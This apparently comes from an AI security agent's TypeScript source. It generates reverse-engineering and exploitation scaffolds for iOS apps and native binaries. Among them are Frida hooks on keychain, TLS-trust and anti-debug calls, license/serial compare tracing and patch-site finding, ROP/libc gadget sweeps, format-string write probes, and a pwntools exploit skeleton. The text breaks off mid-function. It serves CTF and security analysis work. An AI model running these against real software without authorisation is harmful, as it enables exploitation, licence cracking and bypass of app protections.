import type { MissionState } from "./mission.ts";

export type NativeSpecialistCommandProviderDependencies = {
	mission: MissionState;
	target?: string;
	domain: string;
	laneName: string;
	context: string;
	targetArg: string;
	targetPython: string;
	specialists: string[];
	add(label: string, command: string, evidence: string): void;
};

export function createNativeSpecialistCommandProvider(dependencies: NativeSpecialistCommandProviderDependencies) {
	const { mission, target, domain, laneName, context, targetArg, targetPython, specialists, add } = dependencies;
	const targetLooksIpa = Boolean(target && /\.(?:ipa)$/i.test(target));

	const wantsPwnPrimitive =
		/\bpwn\b|\bexploit\b|\brop\b|ret2libc|\bheap\b|tcache|fastbin|format[-_ ]?string|fmtstr|srop|sigreturn|ret2dlresolve|one_gadget|seccomp|seccomp[-_ ]?bpf|syscall filter|pwntools|\bprimitive\b|cyclic|栈|堆/.test(
			context,
		) && /mitigation|primitive|exploit|runtime|proof|verify|poc|triage|map/.test(laneName);
	const wantsExploitReliability =
		(domain === "Exploit reliability" ||
			/autopwn|auto[-_ ]?pwn|exploit reliability|reliable exploit|stable exploit|poc replay|replay matrix|payload stability|crash flake|flake triage|one[-_ ]?click exploit|利用链.*稳定|稳定.*poc|复现矩阵|回放.*验证|一键.*利用/.test(
				context,
			)) &&
		/inventory|normalize|replay|flake|triage|bundle|report|exploit|poc|verify|stability|proof/.test(laneName);

	const wantsIosMobile =
		(domain === "Mobile / iOS" ||
			targetLooksIpa ||
			/(?:\bios\b|\bipa\b|objective-c|objc|swift|mach-o|class-dump|otool|codesign|keychain|jailbreak|越狱|frida|objection)/.test(
				context,
			)) &&
		/(?:\bipa\b|inventory|static|class|map|runtime|hook|network|replay|proof|verify|report|triage)/.test(laneName);
	const wantsFridaTrace =
		/mobile|android|ios|apk|ipa|frida|jadx|apktool|adb|smali|native|binary|elf|mach-o|pe32|reverse|逆向|二进制/.test(
			context,
		) && /runtime|proof|control|flow|observe|verify|primitive|state|poc/.test(laneName);
	const nativeDeepAllowedDomain =
		/Native reverse|Pwn \/ exploit|Mobile \/ Android|Mobile \/ iOS|CTF \/ sandbox/.test(domain) ||
		/native|reverse|binary|elf|pe32|mach-o|wasm|pwn|rop|heap|crackme|license|serial|keygen|patch|symbolic|fuzz|二进制|逆向|反编译|反汇编/.test(
			mission.task.toLowerCase(),
		);
	const wantsNativeDeep =
		nativeDeepAllowedDomain &&
		/native|reverse|binary|elf|pe32|mach-o|wasm|pwn|rop|heap|crackme|license|serial|keygen|patch|symbolic|fuzz|二进制|逆向|反编译|反汇编/.test(
			context,
		) &&
		/headers|triage|map|control|flow|primitive|runtime|proof|poc|verify|patch|fuzz|report/.test(laneName);

	function appendMobileAndNative(): void {
		if (wantsIosMobile) {
			specialists.push("iOS IPA/mobile runtime");
			if (!target) {
				add(
					"ios-ipa-target-discovery",
					"find . -maxdepth 6 -type f \\( -iname '*.ipa' -o -iname 'Info.plist' -o -iname '*.mobileprovision' \\) -o -type d -iname '*.app' 2>/dev/null | head -160 | sed 's/^/[ios-candidate] /'",
					"discover IPA/App bundle candidates before iOS reverse commands",
				);
			}
			add(
				"ios-ipa-inventory-scaffold",
				`cat > /tmp/repi-ios-inventory.sh <<'SH'\nset +e\nTARGET="$1"; OUT="/tmp/repi-ios-ipa"; rm -rf "$OUT"; mkdir -p "$OUT"\nprintf '[ios-ipa] target=%s out=%s\\n' "$TARGET" "$OUT"\n[ -e "$TARGET" ] || { printf '[ios-ipa] target_missing=%s\\n' "$TARGET"; exit 0; }\nfile "$TARGET" 2>/dev/null | sed 's/^/[ios-ipa] file=/'\nsha256sum "$TARGET" 2>/dev/null | awk '{print "[ios-ipa] sha256="$1" path="$2}'\nif [ -f "$TARGET" ] && printf '%s' "$TARGET" | grep -Eiq '\\.ipa$'; then unzip -q "$TARGET" -d "$OUT" 2>/dev/null || true; fi\nAPP=$(find "$OUT" "$TARGET" -maxdepth 4 -type d -name '*.app' 2>/dev/null | head -1)\nprintf '[ios-ipa] app=%s\\n' "\${APP:-<none>}"\nINFO="$APP/Info.plist"\nif [ -f "$INFO" ]; then\n  plutil -p "$INFO" 2>/dev/null | sed 's/^/[ios-plist] /' | head -160 || python3 - <<'PY' "$INFO"\nimport plistlib, sys\nobj=plistlib.load(open(sys.argv[1], 'rb'))\nfor k in ['CFBundleIdentifier','CFBundleExecutable','CFBundleURLTypes','NSAppTransportSecurity','UIBackgroundModes']:\n    print('[ios-plist]', k, '=', obj.get(k))\nPY\nfi\nfind "$APP" -maxdepth 3 -type f \\( -name '*.dylib' -o -name '*.framework' -o -perm -111 \\) 2>/dev/null | head -160 | sed 's/^/[ios-binary] /'\nSH\nchmod +x /tmp/repi-ios-inventory.sh\n/tmp/repi-ios-inventory.sh ${targetArg}`,
				"IPA/App inventory: zip extraction, Info.plist, bundle id, executable/framework map",
			);
			add(
				"ios-macho-class-map-scaffold",
				`cat > /tmp/repi-ios-macho.sh <<'SH'\nset +e\nROOT="/tmp/repi-ios-ipa"\nAPP=$(find "$ROOT" "$1" -maxdepth 5 -type d -name '*.app' 2>/dev/null | head -1)\nBIN=""\nif [ -n "$APP" ] && [ -f "$APP/Info.plist" ]; then\n  EXE=$(python3 - <<'PY' "$APP/Info.plist" 2>/dev/null\nimport plistlib, sys\nprint(plistlib.load(open(sys.argv[1], 'rb')).get('CFBundleExecutable',''))\nPY\n); [ -n "$EXE" ] && BIN="$APP/$EXE"\nfi\n[ -n "$BIN" ] || BIN=$(find "$APP" "$1" -maxdepth 3 -type f -perm -111 2>/dev/null | head -1)\nprintf '[ios-macho] app=%s bin=%s\\n' "\${APP:-<none>}" "\${BIN:-<none>}"\n[ -f "$BIN" ] || exit 0\nfile "$BIN" | sed 's/^/[ios-macho] file=/'\notool -L "$BIN" 2>/dev/null | sed 's/^/[ios-otool] /' | head -120 || true\nnm -m "$BIN" 2>/dev/null | grep -Ei 'SecItem|Keychain|NSURLSession|CryptoKit|CommonCrypto|CCCrypt|jail|debug|ptrace|signature|sign|encrypt|decrypt|token|password' | head -220 | sed 's/^/[ios-symbol] /' || true\nclass-dump "$BIN" 2>/dev/null | grep -Ei '@interface|SecItem|Keychain|NSURLSession|Crypto|Jail|Debug|Login|Auth|Token|Sign' | head -220 | sed 's/^/[ios-class] /' || true\nstrings -a -n 5 "$BIN" | grep -Ei 'https?://|api/|graphql|token|secret|password|signature|nonce|timestamp|keychain|jailbreak|frida|ptrace|SSL|pinning|SecTrust|CCCrypt|CryptoKit' | head -260 | sed 's/^/[ios-string] /'\nSH\nchmod +x /tmp/repi-ios-macho.sh\n/tmp/repi-ios-macho.sh ${targetArg}`,
				"Mach-O/class/selector/string map for iOS auth, crypto, keychain, URLSession, jailbreak and TLS pinning sinks",
			);
			add(
				"ios-frida-objection-hook-scaffold",
				`cat > /tmp/repi-ios-frida-hooks.js <<'JS'\nif (ObjC.available) {\n  console.log('[ios-frida] ObjC runtime ready');\n  const hookObjC = (cls, sel) => {\n    try {\n      const impl = ObjC.classes[cls][sel].implementation;\n      Interceptor.attach(impl, { onEnter(args) { console.log('[ios-hook]', cls, sel, 'self=' + args[0]); } });\n    } catch (e) {}\n  };\n  ['NSURLSession','NSMutableURLRequest','SecItem','LAContext','NSData','NSString'].forEach(c => console.log('[ios-class-check]', c, !!ObjC.classes[c]));\n  hookObjC('NSMutableURLRequest', '- setValue:forHTTPHeaderField:');\n  hookObjC('NSMutableURLRequest', '- setHTTPBody:');\n  hookObjC('LAContext', '- evaluatePolicy:localizedReason:reply:');\n}\nfor (const name of ['SecItemCopyMatching','SecItemAdd','SecItemUpdate','CCCrypt','SecTrustEvaluate','SecTrustEvaluateWithError','ptrace']) {\n  const p = Module.findExportByName(null, name);\n  if (p) Interceptor.attach(p, { onEnter(args) { console.log('[ios-native-hook]', name, args[0], args[1], args[2]); } });\n}\nJS\nprintf '[ios-frida-hook-template] /tmp/repi-ios-frida-hooks.js hooks=NSURLSession,NSMutableURLRequest,SecItem,CCCrypt,SecTrust,ptrace\\n'\nsed -n '1,260p' /tmp/repi-ios-frida-hooks.js\nfrida-ps -Uai 2>/dev/null | head -120 | sed 's/^/[ios-frida-process] /' || true\nobjection --help 2>/dev/null | head -20 | sed 's/^/[ios-objection] /' || true`,
				"iOS Frida/objection hook template for request signing, keychain, crypto, TLS trust and anti-debug sinks",
			);
			add(
				"ios-network-replay-scaffold",
				`python3 - <<'PY'\nimport pathlib, re\nroots=[pathlib.Path('/tmp/repi-ios-ipa'), pathlib.Path(${targetPython})]\nseen=set()\nfor root in roots:\n    if not root.exists(): continue\n    files=[root] if root.is_file() else [p for p in root.rglob('*') if p.is_file()]\n    for p in files[:400]:\n        try: data=p.read_bytes()[:2_000_000]\n        except Exception: continue\n        text=data.decode('utf-8','ignore')\n        for url in re.findall(r'https?://[^\\s"\\'<>]+', text):\n            if url not in seen:\n                seen.add(url); print('[ios-network-replay]', 'url=' + url[:240], 'source=' + str(p))\n        if re.search(r'signature|nonce|timestamp|token|Authorization|SecTrust|pinning|CCCrypt|CryptoKit', text, re.I):\n            print('[ios-network-anchor]', 'source=' + str(p), 'keywords=signature/nonce/token/pinning/crypto')\nprint('[ios-network-replay]', 'next=set captured headers/body from ios-frida hooks and replay with curl/node verifier')\nPY`,
				"iOS network/signing/TLS-pinning replay seed from IPA strings and runtime hook anchors",
			);
		}

		if (wantsNativeDeep) {
			specialists.push("native deep reverse/pwn");
			if (!target) {
				add(
					"native-deep-target-discovery",
					'find . -maxdepth 5 -type f -exec sh -c \'file "$1" | grep -Eq "ELF|PE32|Mach-O|WebAssembly|shared object|executable" && printf "[native-candidate] %s\\n" "$1"\' _ {} \\; | head -120',
					"discover concrete native/binary candidates before deep reverse commands",
				);
			}
			if (target) {
				add(
					"native-deep-symbol-map-scaffold",
					`cat > /tmp/repi-native-symbol-map.sh <<'SH'\nset +e\nTARGET="$1"\nprintf '[native-symbol-map] target=%s\\n' "$TARGET"\nfile "$TARGET" 2>/dev/null | sed 's/^/[native-symbol] file=/'\nsha256sum "$TARGET" 2>/dev/null | awk '{print "[native-symbol] sha256="$1" path="$2}'\nreadelf -hW "$TARGET" 2>/dev/null | sed -n '1,80p' | sed 's/^/[native-header] /'\nreadelf -SW "$TARGET" 2>/dev/null | sed -n '1,120p' | sed 's/^/[native-section] /'\nreadelf -sW "$TARGET" 2>/dev/null | grep -Ei ' main$|strcmp|strncmp|memcmp|strstr|scanf|gets|printf|system|execve|open|read|write|socket|connect|crypto|verify|check|license|serial|flag' | head -180 | sed 's/^/[native-symbol] /'\nobjdump -T "$TARGET" 2>/dev/null | grep -Ei 'GLIBC|strcmp|strncmp|memcmp|strstr|printf|puts|system|read|write|open|socket|connect|crypto' | head -160 | sed 's/^/[native-import] /'\nrabin2 -I "$TARGET" 2>/dev/null | sed -n '1,80p' | sed 's/^/[native-rabin2] /'\nrabin2 -i "$TARGET" 2>/dev/null | head -160 | sed 's/^/[native-import] /'\nstrings -a -n 5 "$TARGET" 2>/dev/null | grep -Ei 'license|serial|key|valid|invalid|verify|check|flag|pass|fail|success|denied|admin|debug|http|token|secret' | head -220 | sed 's/^/[native-string] /'\nSH\nchmod +x /tmp/repi-native-symbol-map.sh\n/tmp/repi-native-symbol-map.sh ${targetArg}`,
					"native symbol/import/section/string map with readelf/objdump/rabin2 fallbacks",
				);
				add(
					"native-deep-decompiler-project-scaffold",
					`cat > /tmp/repi-ghidra-import.sh <<'SH'\nset +e\nTARGET="$1"\nOUT="\${REPI_GHIDRA_OUT:-/tmp/repi-ghidra-project}"\nSCRIPT="/tmp/repi-ghidra-export.java"\nprintf '[native-decompiler] target=%s out=%s\\n' "$TARGET" "$OUT"\ncat > "$SCRIPT" <<'JAVA'\n// REPI Ghidra headless export scaffold. Run with analyzeHeadless if Ghidra is installed.\nimport ghidra.app.script.GhidraScript;\npublic class RepiExport extends GhidraScript { public void run() throws Exception { println("[native-decompiler] program=" + currentProgram.getName()); println("[native-decompiler] imageBase=" + currentProgram.getImageBase()); } }\nJAVA\nif command -v analyzeHeadless >/dev/null 2>&1; then\n  mkdir -p "$OUT"\n  analyzeHeadless "$OUT" repi -import "$TARGET" -postScript "$SCRIPT" -deleteProject 2>&1 | sed -n '1,220p' | sed 's/^/[native-decompiler] /'\nelse\n  printf '[native-decompiler] analyzeHeadless=missing script=%s\\n' "$SCRIPT"\n  command -v r2 >/dev/null 2>&1 && r2 -A -q -c 'aaa; afl~main,sym.; iz~license,key,serial,valid,invalid,flag; s main; pdf; q' "$TARGET" 2>/dev/null | head -260 | sed 's/^/[native-decompiler-fallback] /'\nfi\nSH\nchmod +x /tmp/repi-ghidra-import.sh\n/tmp/repi-ghidra-import.sh ${targetArg}`,
					"Ghidra headless import/export scaffold with r2 decompiler fallback for control-flow anchors",
				);
				add(
					"native-deep-compare-trace-scaffold",
					`cat > /tmp/repi-native-compare-trace.gdb <<'GDB'\nset pagination off\nset disassembly-flavor intel\nset follow-fork-mode child\nset breakpoint pending on\nbreak strcmp\ncommands\nsilent\nprintf "[native-compare] fn=strcmp a=%s b=%s rip=%p\\n", $rdi, $rsi, $rip\nbt 4\ncontinue\nend\nbreak strncmp\ncommands\nsilent\nprintf "[native-compare] fn=strncmp a=%s b=%s n=%ld rip=%p\\n", $rdi, $rsi, $rdx, $rip\nbt 4\ncontinue\nend\nbreak memcmp\ncommands\nsilent\nprintf "[native-compare] fn=memcmp a=%p b=%p n=%ld rip=%p\\n", $rdi, $rsi, $rdx, $rip\nx/16bx $rdi\nx/16bx $rsi\nbt 4\ncontinue\nend\nrun\ninfo registers\nx/24gx $rsp\nquit\nGDB\nprintf '[native-compare-trace] script=/tmp/repi-native-compare-trace.gdb target=%s\\n' ${targetArg}\nprintf 'run: gdb -q %s -x /tmp/repi-native-compare-trace.gdb\\n' ${targetArg}`,
					"GDB comparison breakpoint trace scaffold capturing strcmp/strncmp/memcmp args, backtrace, registers, and stack",
				);
				add(
					"native-deep-patch-hypothesis-scaffold",
					`python3 - <<'PY'\nimport json, os, pathlib, re, subprocess, sys\ntarget=${targetPython}\nprint('[native-patch] target=' + target)\ntry:\n    out=subprocess.run(['objdump','-d','-Mintel',target], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=20).stdout\nexcept Exception as exc:\n    print('[native-patch] objdump_error=' + type(exc).__name__ + ':' + str(exc)[:160]); out=''\npatterns=re.compile(r'\\b(jz|je|jnz|jne|ja|jb|jg|jl|jge|jle|cmp|test|call)\\b.*?(strcmp|strncmp|memcmp|verify|check|license|serial|flag|fail|success)?', re.I)\ncandidates=[]\nfor line in out.splitlines():\n    if patterns.search(line):\n        candidates.append(line.strip())\n        if len(candidates) >= 80: break\npath=pathlib.Path('/tmp/repi-native-patch-candidates.json')\npath.write_text(json.dumps({'target':target,'candidates':candidates}, indent=2))\nprint('[native-patch] candidates=' + str(len(candidates)) + ' artifact=' + str(path))\nfor line in candidates[:30]: print('[native-patch-candidate]', line)\nprint('[native-patch] next=prove branch condition with native-deep-compare-trace before patching bytes')\nPY`,
					"branch/compare patch hypothesis scaffold that emits candidate jump/cmp/test sites without mutating target",
				);
				add(
					"native-deep-symbolic-fuzz-scaffold",
					`cat > /tmp/repi-native-symbolic-fuzz.py <<'PY'\n#!/usr/bin/env python3\nimport os, pathlib, subprocess, sys, tempfile, time\ntarget=sys.argv[1]\nprint('[native-symbolic] target=' + target)\ntry:\n    import angr  # type: ignore\n    project=angr.Project(target, auto_load_libs=False)\n    print('[native-symbolic] angr=present arch=' + str(project.arch) + ' entry=' + hex(project.entry))\n    cfg=project.analyses.CFGFast(normalize=True)\n    print('[native-symbolic] cfg_functions=' + str(len(cfg.kb.functions)))\n    for addr, fn in list(cfg.kb.functions.items())[:80]:\n        name=getattr(fn, 'name', '')\n        if any(x in name.lower() for x in ['main','check','verify','license','serial','strcmp','memcmp']): print('[native-symbolic-fn]', hex(addr), name)\nexcept Exception as exc:\n    print('[native-symbolic] angr=missing_or_failed error=' + type(exc).__name__ + ':' + str(exc)[:160])\nseeds=[b'', b'A'*8, b'A'*32, b'flag\\n', b'license\\n', b'123456\\n']\nfor i, data in enumerate(seeds):\n    try:\n        started=time.time(); r=subprocess.run([target], input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)\n        print('[native-fuzz] seed=%d len=%d exit=%s ms=%d stdout=%r stderr=%r' % (i,len(data),r.returncode,int((time.time()-started)*1000),r.stdout[:80],r.stderr[:80]))\n    except Exception as exc:\n        print('[native-fuzz] seed=%d error=%s:%s' % (i,type(exc).__name__,str(exc)[:120]))\nPY\nchmod +x /tmp/repi-native-symbolic-fuzz.py\npython3 /tmp/repi-native-symbolic-fuzz.py ${targetArg}`,
					"angr/CFG symbolic scaffold plus bounded seed fuzz smoke test for control-flow and crash anchors",
				);
			}
		}
	}

	function appendPwnAndExploit(): void {
		if (wantsPwnPrimitive) {
			specialists.push("pwn primitive");
			add(
				"pwn-primitive-mitigation-fingerprint",
				`file ${targetArg}; checksec --file=${targetArg} 2>/dev/null || true; ldd ${targetArg} 2>/dev/null || true; patchelf --print-interpreter ${targetArg} 2>/dev/null || true`,
				"pwn primitive mitigation, loader, and libc fingerprint",
			);
			add(
				"pwn-primitive-cyclic-crash",
				`python3 - <<'PY'\nimport pathlib, string\nalphabet = string.ascii_lowercase.encode() + string.ascii_uppercase.encode() + string.digits.encode()\nout = bytearray()\nfor a in alphabet:\n  for b in alphabet:\n    for c in alphabet:\n      out += bytes([a,b,c])\npathlib.Path('/tmp/repi-cyclic.bin').write_bytes(bytes(out[:4096]))\nprint('/tmp/repi-cyclic.bin', len(out[:4096]))\nPY\nif command -v gdb >/dev/null 2>&1; then (gdb -q ${targetArg} -ex 'set pagination off' -ex 'run < /tmp/repi-cyclic.bin' -ex 'info registers' -ex 'bt' -ex 'x/24gx $rsp' -ex 'quit' || true) 2>&1 | tee /tmp/repi-pwn-crash.log; else (${targetArg} < /tmp/repi-cyclic.bin || true) > /tmp/repi-pwn-crash.log 2>&1; sed -n '1,160p' /tmp/repi-pwn-crash.log; fi`,
				"cyclic crash/control proof with registers/backtrace fallback",
			);
			add(
				"pwn-primitive-offset-analyzer",
				`cat > /tmp/repi-pwn-offset-analyzer.py <<'PY'\n#!/usr/bin/env python3\nimport os, pathlib, re, string, sys\n\ndef cyclic(length=8192):\n    alphabet = (string.ascii_lowercase + string.ascii_uppercase + string.digits).encode()\n    out = bytearray()\n    for a in alphabet:\n        for b in alphabet:\n            for c in alphabet:\n                out += bytes([a, b, c])\n                if len(out) >= length:\n                    return bytes(out[:length])\n    return bytes(out[:length])\n\ndef clean_hex(value):\n    text = value.lower().replace('0x', '')\n    text = re.sub(r'[^0-9a-f]', '', text)\n    if len(text) % 2:\n        text = '0' + text\n    return text\n\ndef byte_candidates(value):\n    text = clean_hex(value)\n    if not text:\n        return []\n    raw = bytes.fromhex(text)\n    chunks = [raw, raw[::-1]]\n    for size in (8, 4, 3, 2):\n        if len(raw) >= size:\n            chunks.extend([raw[-size:], raw[-size:][::-1], raw[:size], raw[:size][::-1]])\n    seen, out = set(), []\n    for chunk in chunks:\n        if not chunk or chunk in seen or set(chunk) == {0}:\n            continue\n        seen.add(chunk)\n        out.append(chunk)\n    return out\n\npat = pathlib.Path('/tmp/repi-cyclic.bin')\ndata = pat.read_bytes() if pat.exists() else cyclic()\nif not pat.exists():\n    pat.write_bytes(data)\nvalues = []\nenv_value = os.getenv('REPI_CRASH_VALUE', '').strip()\nif env_value:\n    values.append(('env', env_value))\nfor arg in sys.argv[1:]:\n    values.append(('argv', arg))\nlog = pathlib.Path('/tmp/repi-pwn-crash.log')\nif log.exists():\n    text = log.read_text(errors='replace')\n    for reg, value in re.findall(r'\\b(RIP|EIP|PC|rip|eip|pc)\\s*[:=]?\\s*(0x[0-9a-fA-F]+)', text):\n        values.append((reg.upper(), value))\nseen_values, unique = set(), []\nfor source, value in values:\n    key = (source, value.lower())\n    if key not in seen_values:\n        seen_values.add(key)\n        unique.append((source, value))\nif not unique:\n    print('[pwn-offset] crash_value=<unset> offset=-1 note=set REPI_CRASH_VALUE or rerun pwn-primitive-cyclic-crash')\n    sys.exit(0)\nmatched = False\nfor source, value in unique:\n    local_match = False\n    for candidate in byte_candidates(value):\n        off = data.find(candidate)\n        print(f'[pwn-offset] crash_value={value} source={source} candidate={candidate.hex()} offset={off}')\n        if off >= 0:\n            matched = True\n            local_match = True\n            break\n    if not local_match:\n        print(f'[pwn-offset] crash_value={value} source={source} offset=-1')\nif not matched:\n    print(f'[pwn-offset] no_match=true pattern_len={len(data)}')\nPY\nchmod +x /tmp/repi-pwn-offset-analyzer.py\npython3 /tmp/repi-pwn-offset-analyzer.py`,
				"automatic cyclic offset analyzer from RIP/EIP/PC or REPI_CRASH_VALUE",
			);
			add(
				"pwn-primitive-gadget-sweep",
				`(ROPgadget --binary ${targetArg} --only 'pop|ret|syscall' 2>/dev/null || ropper --file ${targetArg} --search 'pop rdi; ret' 2>/dev/null || objdump -d ${targetArg} | grep -Ei 'pop|ret|syscall' | head -120)`,
				"ROP/JOP gadget and syscall surface",
			);
			add(
				"pwn-primitive-rop-libc-scaffold",
				`cat > /tmp/repi-pwn-rop-libc.py <<'PY'\n#!/usr/bin/env python3\nimport shutil, subprocess, sys\nBIN = sys.argv[1] if len(sys.argv) > 1 else ${targetPython}\n\ndef run(argv):\n    try:\n        out = subprocess.run(argv, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=8)\n        return out.stdout\n    except Exception as exc:\n        return f'{type(exc).__name__}: {exc}\\n'\n\nprint(f'[pwn-rop-chain] target={BIN}')\ntry:\n    from pwn import ELF, ROP, context\n    context.log_level = 'error'\n    elf = ELF(BIN, checksec=False)\n    print(f'[pwn-rop-chain] arch={elf.arch} bits={elf.bits} pie={elf.pie} nx={getattr(elf, "nx", "?")} canary={getattr(elf, "canary", "?")} entry={hex(elf.entry)}')\n    for name in ['puts', 'printf', 'read', 'write', 'system', '__libc_start_main']:\n        if name in elf.plt:\n            print(f'[pwn-rop-chain] {name}@plt={hex(elf.plt[name])}')\n        if name in elf.got:\n            print(f'[pwn-rop-chain] {name}@got={hex(elf.got[name])}')\n    try:\n        rop = ROP(elf)\n        for gadget in (['ret'], ['pop rdi', 'ret'], ['pop rsi', 'ret'], ['pop rdx', 'ret'], ['syscall']):\n            found = rop.find_gadget(gadget)\n            if found:\n                label = '_'.join(gadget).replace(' ', '_')\n                print(f'[pwn-rop-chain] {label}={hex(found.address)}')\n    except Exception as exc:\n        print(f'[pwn-rop-chain] rop_error={type(exc).__name__}:{exc}')\n    try:\n        binsh = next(elf.search(b'/bin/sh'))\n        print(f'[pwn-rop-chain] bin_sh={hex(binsh)}')\n    except StopIteration:\n        pass\nexcept Exception as exc:\n    print(f'[pwn-rop-chain] pwntools_unavailable={type(exc).__name__}:{exc}')\n\nprint('[pwn-rop-chain] dynamic_symbols')\nprint(run(['objdump', '-T', BIN])[:4000] if shutil.which('objdump') else 'objdump missing')\nPY\nchmod +x /tmp/repi-pwn-rop-libc.py\nfile ${targetArg}; checksec --file=${targetArg} 2>/dev/null || true; ldd ${targetArg} 2>/dev/null || true\nLIBC=$(ldd ${targetArg} 2>/dev/null | awk '/libc\\.so/{print $(NF-1); exit}')\nif [ -n "$LIBC" ] && [ -e "$LIBC" ]; then echo "[pwn-libc-fingerprint] libc=$LIBC"; file "$LIBC"; sha256sum "$LIBC"; strings -a "$LIBC" | grep -m1 -E 'GNU C Library|GLIBC' || true; fi\npython3 /tmp/repi-pwn-rop-libc.py ${targetArg}\nobjdump -R ${targetArg} 2>/dev/null | grep -Ei 'puts|printf|read|write|system|__libc_start_main' | sed 's/^/[pwn-rop-chain] got /' | head -80 || true\nobjdump -d ${targetArg} 2>/dev/null | grep -Ei '<(puts|printf|read|write|system)@plt>' | sed 's/^/[pwn-rop-chain] plt /' | head -80 || true\n(ROPgadget --binary ${targetArg} --only 'pop|ret|syscall' 2>/dev/null || ropper --file ${targetArg} --search 'pop rdi; ret' 2>/dev/null || objdump -d ${targetArg} | grep -Ei 'pop|ret|syscall' | head -180)`,
				"ROP/libc scaffold with PLT/GOT, pop gadgets, libc fingerprint, and pwntools/objdump fallbacks",
			);
			add(
				"pwn-primitive-local-verifier",
				`cat > /tmp/repi-pwn-local-verifier.py <<'PY'\n#!/usr/bin/env python3\nimport os, re, shlex, subprocess, sys\nBIN = sys.argv[1] if len(sys.argv) > 1 else ${targetPython}\nraw_offset = os.getenv('REPI_OFFSET', '0').strip() or '0'\ntry:\n    offset = int(raw_offset, 0)\nexcept ValueError:\n    offset = 0\npayload_hex = re.sub(r'\\s+', '', os.getenv('REPI_PAYLOAD_HEX', '').strip())\nret_hex = re.sub(r'\\s+', '', os.getenv('REPI_RET_HEX', '4242424242424242').strip())\nif payload_hex:\n    payload = bytes.fromhex(payload_hex)\nelif offset > 0:\n    payload = b'A' * offset + bytes.fromhex(ret_hex)\nelse:\n    payload = b'A' * 256\nif not payload.endswith(b'\\n'):\n    payload += b'\\n'\nargv = [BIN] + shlex.split(os.getenv('REPI_ARGV', ''))\ntimeout = float(os.getenv('REPI_TIMEOUT', '3'))\nprint(f'[pwn-local-verifier] target={BIN} offset={offset} payload_len={len(payload)} argv={argv[1:]}')\ntry:\n    proc = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out, err = proc.communicate(payload, timeout=timeout)\n    print(f'[pwn-local-verifier] exit={proc.returncode} stdout_len={len(out)} stderr_len={len(err)} timeout=false')\n    if out:\n        print('[pwn-local-verifier:stdout]', out[:1200].decode('utf-8', 'replace'))\n    if err:\n        print('[pwn-local-verifier:stderr]', err[:1200].decode('utf-8', 'replace'))\nexcept subprocess.TimeoutExpired:\n    proc.kill()\n    out, err = proc.communicate()\n    print(f'[pwn-local-verifier] exit=timeout stdout_len={len(out)} stderr_len={len(err)} timeout=true interactive_candidate=true')\nexcept Exception as exc:\n    print(f'[pwn-local-verifier] error={type(exc).__name__}:{exc}')\nPY\nchmod +x /tmp/repi-pwn-local-verifier.py\npython3 /tmp/repi-pwn-local-verifier.py ${targetArg}`,
				"local exploit payload smoke verifier using REPI_OFFSET or REPI_PAYLOAD_HEX",
			);
			add(
				"pwn-primitive-pwntools-skeleton",
				`cat > /tmp/repi-exploit.py <<'PY'\nfrom pwn import *\nBIN = ${targetPython}\ncontext.binary = exe = ELF(BIN, checksec=False)\ncontext.log_level = 'debug'\nHOST, PORT = args.HOST or '127.0.0.1', int(args.PORT or 31337)\ndef start():\n    return remote(HOST, PORT) if args.REMOTE else process([BIN])\nio = start()\n# TODO: paste leak/offset from pwn-primitive-cyclic-crash and gadget sweep\npayload = b'A' *  cyclic_find(0x6161616c, n=4)\nio.sendline(payload)\nio.interactive()\nPY\nsed -n '1,220p' /tmp/repi-exploit.py`,
				"pwntools exploit scaffold bound to current binary",
			);
			add(
				"pwn-advanced-heap-tcache-scaffold",
				`cat > /tmp/repi-pwn-heap-tcache.gdb <<'GDB'
set pagination off
set confirm off
break malloc
break free
run
info registers
backtrace
info proc mappings
python
print('[pwn-heap] gdb_python_ready=true')
end
heap bins
tcachebins
fastbins
unsortedbin
quit
GDB
if command -v gdb >/dev/null 2>&1; then (gdb -q ${targetArg} -x /tmp/repi-pwn-heap-tcache.gdb || true) 2>&1 | tee /tmp/repi-pwn-heap-tcache.log | sed -n '1,220p'; else echo '[pwn-heap] gdb=missing target='${targetArg}; fi
printf '%s\\n' '[pwn-tcache] artifact=/tmp/repi-pwn-heap-tcache.log anchors=malloc,free,tcachebins,fastbins,unsortedbin'`,
				"heap/tcache bin state probe for allocator primitive classification",
			);
			add(
				"pwn-advanced-format-string-scaffold",
				`cat > /tmp/repi-pwn-fmtstr.py <<'PY'
#!/usr/bin/env python3
import os, subprocess, sys
BIN = sys.argv[1] if len(sys.argv) > 1 else ${targetPython}
probes = [b'%p.' * 12, b'%lx.' * 12, b'AAAA%7$pBBBB', b'%s', b'%n']
timeout = float(os.getenv('REPI_FMT_TIMEOUT', '2'))
print('[pwn-fmtstr] target=' + BIN + ' probes=' + str(len(probes)))
for idx, payload in enumerate(probes, 1):
    try:
        proc = subprocess.run([BIN], input=payload + b'\\n', stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        out = (proc.stdout + b'\\n' + proc.stderr)[:240].decode('utf-8', 'replace').replace('\\n', '\\\\n')
        print('[pwn-fmtstr-probe] idx=' + str(idx) + ' exit=' + str(proc.returncode) + ' payload=' + payload.decode('latin1', 'replace') + ' output=' + out)
    except Exception as exc:
        print('[pwn-fmtstr-probe] idx=' + str(idx) + ' error=' + type(exc).__name__ + ':' + str(exc))
try:
    from pwn import FmtStr, fmtstr_payload
    print('[pwn-fmtstr] pwntools_fmtstr=true helper=FmtStr,fmtstr_payload')
    print('[pwn-fmtstr] scaffold=fmtstr_payload(offset, {write_addr: value}, write_size=short)')
except Exception as exc:
    print('[pwn-fmtstr] pwntools_fmtstr=false reason=' + type(exc).__name__ + ':' + str(exc))
PY
chmod +x /tmp/repi-pwn-fmtstr.py
python3 /tmp/repi-pwn-fmtstr.py ${targetArg}`,
				"format-string leak/write probe and pwntools fmtstr_payload scaffold",
			);
			add(
				"pwn-advanced-srop-ret2dlresolve-scaffold",
				`cat > /tmp/repi-pwn-srop-dlresolve.py <<'PY'
#!/usr/bin/env python3
import shutil, subprocess, sys
BIN = sys.argv[1] if len(sys.argv) > 1 else ${targetPython}
def run(argv):
    try:
        return subprocess.run(argv, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10).stdout
    except Exception as exc:
        return type(exc).__name__ + ': ' + str(exc)
print('[pwn-srop] target=' + BIN)
if shutil.which('ROPgadget'):
